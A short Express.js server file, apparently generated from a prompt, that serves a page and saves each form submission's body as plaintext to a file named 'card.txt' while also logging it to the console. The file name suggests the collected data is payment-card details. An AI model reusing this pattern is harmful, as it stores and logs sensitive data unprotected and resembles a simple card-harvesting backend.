/* Change the code above to a node server */
// Path: server.js
const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const port = 9000;
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(express.static("public"));
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});
app.post("/submit", (req, res) => {
  console.log(req.body);
  fs.writeFile("card.txt", JSON.stringify(req.body), (err) => {
    if (err) throw err;
    console.log("The file has been saved!");
  });
  res.sendFile(path.join(__dirname, "confirmation.html"));
});
app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
